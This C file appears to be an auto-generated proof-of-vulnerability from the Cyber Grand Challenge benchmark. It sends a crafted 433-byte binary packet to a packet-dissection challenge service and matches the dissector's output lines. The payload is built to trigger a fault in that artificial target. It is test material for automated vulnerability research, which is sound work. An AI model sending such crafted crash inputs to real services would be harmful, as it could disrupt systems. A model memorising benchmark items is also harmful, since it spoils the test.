#include "libpov.h"
int main(int cgc_argc, char *cgc_argv[]) {
   cgc_negotiate_type1(0x0, 0x0, 0);
   do {
      //*** writing data
      static unsigned char write_00000_00000[] = 
         "\xb1\x01\x00\x00";
      static unsigned int write_00000_00000_len = 4;
      unsigned char *write_00000 = NULL;
      unsigned int write_00000_len = 0;
      write_00000 = cgc_append_buf(write_00000, &write_00000_len, write_00000_00000, write_00000_00000_len);
      if (write_00000_len > 0) {
         cgc_transmit_all(1, write_00000, write_00000_len);
      }
      cgc_free(write_00000);
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00001_00000[] = 
         "\x01\x00\x00\x00\x00\x00\x00\x00\x99\x01\x00\x00\x91\x01\x00\x00"
         "\x00\x00\x00\x00\x10\x01\x10\x10\x00\x00\x00\x00\x91\x01\x00\x00"
         "\xbb\xff\x0a\xea\x28\xa5\x4d\x99\x3f\x00\x09\x93\xed\xe3\xbc\x2f"
         "\x88\x05\xa4\xee\x10\x00\x00\x00\x41\x00\x41\x00\x52\x27\x00\xeb"
         "\xfb\xf8\x01\x36\x2b\x8a\x41\x11\x07\x6c\x6a\x41\x01\xe7\x1e\xe8"
         "\xc8\xff\x15\x42\xd2\xa2\xe9\xa9\xe1\xdb\xcf\x72\xa7\x66\x33\x40"
         "\x01\x60\xac\xad\x51\x2c\x16\x70\xf9\x2c\x41\x00\x01\x00\x66\x41"
         "\x00\x46\xb9\xc6\x20\x62\x41\x00\xb2\xd0\xac\xf2\x01\x00\xb0\xff"
         "\x33\x59\x87\x74\xf3\x05\xd2\x31\x6c\x4e\x56\xc8\x11\xc6\xa4\x60"
         "\xae\xaf\xa4\xb2\xc0\x56\x21\x52\x11\xd3\x2d\x8a\xfe\x9b\x63\xdb"
         "\x9a\x65\x94\xd9\xb5\xb0\x2b\xd0\x67\x5b\xd6\xba\x89\x82\x93\xf9"
         "\x4f\x09\x6f\xed\x96\x8e\x37\x14\x78\x2e\x71\x76\xc7\xd5\xd0\x4d"
         "\x4c\x33\x07\x29\xf6\x98\x6c\x0e\x67\x20\xde\xef\xbb\x28\x09\x2e"
         "\x8b\x92\x76\x95\xb4\xa5\x43\x42\x59\xc1\x5b\xce\xd7\xd3\xcb\x18"
         "\x3c\xfa\x42\x1c\x29\x36\xb0\xc8\x81\x61\x63\xad\x73\xa9\x57\x67"
         "\xd6\x9d\x80\xcd\x0b\x96\x06\x17\x31\xfd\xd8\x17\x10\x0e\xf6\xdb"
         "\x58\xd0\xa7\x20\xbe\x0b\xb1\xf3\x74\xc1\x7e\x78\xaa\xe3\x6b\x45"
         "\x8b\x1a\xcf\x50\x58\x0a\x39\xa4\x34\xe8\x67\x07\x45\xf9\xc6\xd0"
         "\x44\xd1\x7d\x87\xce\x38\xd8\xea\x5d\x95\x62\xac\x49\x5f\xe8\xe3"
         "\xff\xfb\xaf\x2e\x14\x0f\xda\x47\x72\xdf\x7d\x0a\xf5\x34\x88\x60"
         "\x6b\x3f\x17\xad\x7f\xc6\x9b\x8d\x30\x6a\x98\x7a\xf9\xc3\xda\x31"
         "\xc1\x67\x45\xf6\x6e\xfe\xfc\x98\xbd\xfa\x01\x46\x8b\xcd\x06\xcd"
         "\x79\x05\x39\xb9\x31\x6d\x62\xf0\xd1\xad\x26\x8e\x99\x70\xc7\x9c"
         "\x0d\xe0\x36\xc1\xfd\xfa\x45\xe9\xe6\x21\x01\xda\x54\xfb\x9b\xac"
         "\x29\x03\x1c\x65\x64\x39\x8f\xae\x8c\xbb\x16\x8e\xae\x61\x08\x5d"
         "\xef\x01\x4d\xca\x90\xb2\x23\x41\x42\xe6\xcb\xfc\x6d\x10\xc1\x94"
         "\xdd\x4f\x55\x04\x7f\xfd\x1c\xdf\x13\x94\x54\xae\xc6\x97\x0e\x7f"
         "\x97";
      static unsigned int write_00001_00000_len = 433;
      unsigned char *write_00001 = NULL;
      unsigned int write_00001_len = 0;
      write_00001 = cgc_append_buf(write_00001, &write_00001_len, write_00001_00000, write_00001_00000_len);
      if (write_00001_len > 0) {
         cgc_transmit_all(1, write_00001, write_00001_len);
      }
      cgc_free(write_00001);
   } while (0);
   do {
      unsigned char *read_00000;
      unsigned int read_00000_len;
      unsigned int read_00000_ptr = 0;
      //**** delimited read
      static unsigned char read_00000_delim[] = 
         "\x0a";
      read_00000 = NULL;
      read_00000_len = 0;
      int read_00000_res = cgc_delimited_read(0, &read_00000, &read_00000_len, read_00000_delim, 1);
      if (read_00000_res) {} //silence unused variable warning
      //**** read match data
      static unsigned char match_00000_00000[] = 
         "\x53\x74\x61\x72\x74\x69\x6e\x67\x20\x64\x69\x73\x73\x65\x63\x74"
         "\x69\x6f\x6e\x2e\x2e\x2e";
      read_00000_ptr += cgc_data_match(read_00000 + read_00000_ptr, read_00000_len - read_00000_ptr, match_00000_00000, 22);
      cgc_free(read_00000);
      if (read_00000_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      unsigned char *read_00001;
      unsigned int read_00001_len;
      unsigned int read_00001_ptr = 0;
      //**** delimited read
      static unsigned char read_00001_delim[] = 
         "\x3d\x3d\x3d\x3d\x0a";
      read_00001 = NULL;
      read_00001_len = 0;
      int read_00001_res = cgc_delimited_read(0, &read_00001, &read_00001_len, read_00001_delim, 5);
      if (read_00001_res) {} //silence unused variable warning
      /* read match pcre:
.*New Packet
*/
      static char read_00001_00000_regex[] = 
         "\x2e\x2a\x4e\x65\x77\x20\x50\x61\x63\x6b\x65\x74";
      static match_result read_00001_00000_match;
      pcre *read_00001_00000_pcre = cgc_init_regex(read_00001_00000_regex);
      if (read_00001_00000_pcre != NULL) {
         int rc = cgc_regex_match(read_00001_00000_pcre, 0, read_00001 + read_00001_ptr, read_00001_len - read_00001_ptr, &read_00001_00000_match);
         if (rc > 0) {
            read_00001_ptr += read_00001_00000_match.match_end - read_00001_00000_match.match_start;
         }
         else {
            //this is a pov so what does this even mean?
            //why would we quit on failed match, just keep sending stuff.
         }
         pcre_free(read_00001_00000_pcre);
      }
      else {
         //this is a pov so what does this even mean?
         //why would we quit on failed regex compile, just keep sending stuff.
      }
      cgc_free(read_00001);
      if (read_00001_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      unsigned char *read_00002;
      unsigned int read_00002_len;
      unsigned int read_00002_ptr = 0;
      //**** delimited read
      static unsigned char read_00002_delim[] = 
         "\x3d\x3d\x3d\x0a";
      read_00002 = NULL;
      read_00002_len = 0;
      int read_00002_res = cgc_delimited_read(0, &read_00002, &read_00002_len, read_00002_delim, 4);
      if (read_00002_res) {} //silence unused variable warning
      /* read match pcre:
.*===llama
*/
      static char read_00002_00000_regex[] = 
         "\x2e\x2a\x3d\x3d\x3d\x6c\x6c\x61\x6d\x61";
      static match_result read_00002_00000_match;
      pcre *read_00002_00000_pcre = cgc_init_regex(read_00002_00000_regex);
      if (read_00002_00000_pcre != NULL) {
         int rc = cgc_regex_match(read_00002_00000_pcre, 0, read_00002 + read_00002_ptr, read_00002_len - read_00002_ptr, &read_00002_00000_match);
         if (rc > 0) {
            read_00002_ptr += read_00002_00000_match.match_end - read_00002_00000_match.match_start;
         }
         else {
            //this is a pov so what does this even mean?
            //why would we quit on failed match, just keep sending stuff.
         }
         pcre_free(read_00002_00000_pcre);
      }
      else {
         //this is a pov so what does this even mean?
         //why would we quit on failed regex compile, just keep sending stuff.
      }
      cgc_free(read_00002);
      if (read_00002_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      unsigned char *read_00003;
      unsigned int read_00003_len;
      unsigned int read_00003_ptr = 0;
      //**** delimited read
      static unsigned char read_00003_delim[] = 
         "\x3d\x3d\x3d\x0a";
      read_00003 = NULL;
      read_00003_len = 0;
      int read_00003_res = cgc_delimited_read(0, &read_00003, &read_00003_len, read_00003_delim, 4);
      if (read_00003_res) {} //silence unused variable warning
      /* read match pcre:
.*===llamaatophan
*/
      static char read_00003_00000_regex[] = 
         "\x2e\x2a\x3d\x3d\x3d\x6c\x6c\x61\x6d\x61\x61\x74\x6f\x70\x68\x61"
         "\x6e";
      static match_result read_00003_00000_match;
      pcre *read_00003_00000_pcre = cgc_init_regex(read_00003_00000_regex);
      if (read_00003_00000_pcre != NULL) {
         int rc = cgc_regex_match(read_00003_00000_pcre, 0, read_00003 + read_00003_ptr, read_00003_len - read_00003_ptr, &read_00003_00000_match);
         if (rc > 0) {
            read_00003_ptr += read_00003_00000_match.match_end - read_00003_00000_match.match_start;
         }
         else {
            //this is a pov so what does this even mean?
            //why would we quit on failed match, just keep sending stuff.
         }
         pcre_free(read_00003_00000_pcre);
      }
      else {
         //this is a pov so what does this even mean?
         //why would we quit on failed regex compile, just keep sending stuff.
      }
      cgc_free(read_00003);
      if (read_00003_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      unsigned char *read_00004;
      unsigned int read_00004_len;
      unsigned int read_00004_ptr = 0;
      //**** delimited read
      static unsigned char read_00004_delim[] = 
         "\x3d\x3d\x3d\x0a";
      read_00004 = NULL;
      read_00004_len = 0;
      int read_00004_res = cgc_delimited_read(0, &read_00004, &read_00004_len, read_00004_delim, 4);
      if (read_00004_res) {} //silence unused variable warning
      /* read match pcre:
.*Dissection finished
*/
      static char read_00004_00000_regex[] = 
         "\x2e\x2a\x44\x69\x73\x73\x65\x63\x74\x69\x6f\x6e\x20\x66\x69\x6e"
         "\x69\x73\x68\x65\x64";
      static match_result read_00004_00000_match;
      pcre *read_00004_00000_pcre = cgc_init_regex(read_00004_00000_regex);
      if (read_00004_00000_pcre != NULL) {
         int rc = cgc_regex_match(read_00004_00000_pcre, 0, read_00004 + read_00004_ptr, read_00004_len - read_00004_ptr, &read_00004_00000_match);
         if (rc > 0) {
            read_00004_ptr += read_00004_00000_match.match_end - read_00004_00000_match.match_start;
         }
         else {
            //this is a pov so what does this even mean?
            //why would we quit on failed match, just keep sending stuff.
         }
         pcre_free(read_00004_00000_pcre);
      }
      else {
         //this is a pov so what does this even mean?
         //why would we quit on failed regex compile, just keep sending stuff.
      }
      cgc_free(read_00004);
      if (read_00004_ptr) {}  //silence unused variable warning if any
   } while (0);
}
